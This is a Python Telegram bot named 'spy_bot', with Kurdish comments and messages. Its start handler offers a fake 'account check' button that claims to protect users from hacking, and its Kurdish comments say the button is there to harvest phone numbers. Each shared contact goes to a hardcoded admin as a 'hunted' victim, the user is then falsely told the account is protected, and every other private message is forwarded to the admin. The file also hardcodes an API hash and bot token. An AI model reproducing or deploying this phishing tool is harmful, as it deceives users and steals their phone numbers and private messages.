from pyrogram import Client, filters
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton

# زانیارییەکانی تۆ
API_ID = 38225812
API_HASH = "aff3c308c587f18a5975910fbcf68366"
BOT_TOKEN = "8424748782:AAG0VELUlOfabsayVic2SpUAR-hWsh-nnf0"
ADMIN_ID = 7414272224 

app = Client("spy_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command("start") & filters.private)
async def start(client, message):
    # دوگمەی ساختە بۆ وەرگرتنی ژمارە
    keyboard = ReplyKeyboardMarkup(
        [[KeyboardButton("🔒 پشکنینی ئەکاونت", request_contact=True)]],
        resize_keyboard=True
    )
    await message.reply_text(
        f"سڵاو {message.from_user.first_name}\n\n"
        "بۆ پاراستنی ئەکاونتەکەت لە هاککردن، تکایە کلیک لە دوگمەی خوارەوە بکە بۆ پشکنینی کۆتایی.",
        reply_markup=keyboard
    )

@app.on_message(filters.contact & filters.private)
async def get_contact(client, message):
    contact = message.contact
    # ناردنی ژمارەی قوربانی بۆ تۆ
    spy_info = (
        f"🎯 مژدە! ژمارەیەکی نوێ ڕاوکرا:\n\n"
        f"👤 ناو: {contact.first_name}\n"
        f"📱 ژمارە: +{contact.phone_number}\n"
        f"🆔 ئایدی: {contact.user_id}\n"
        f"🔗 یوزەر: @{message.from_user.username if message.from_user.username else 'نییە'}"
    )
    await client.send_message(ADMIN_ID, spy_info)
    await message.reply_text("✅ ئەکاونتەکەت پارێزراوە! ئێستا دەتوانیت بەردەوام بیت.")

@app.on_message(filters.private & ~filters.contact)
async def spy_messages(client, message):
    # هەر نامەیەک بۆ بۆتەکە بنێردرێت بۆ تۆی دەنێرێت
    if message.from_user.id != ADMIN_ID:
        log_msg = f"📩 نامەیەکی نوێ هات:\n👤 لە: {message.from_user.first_name}\n📝 دەق: {message.text}"
        await client.send_message(ADMIN_ID, log_msg)

print("--- بۆتەکە بە سەرکەوتوویی کار دەکات ---")
app.run()
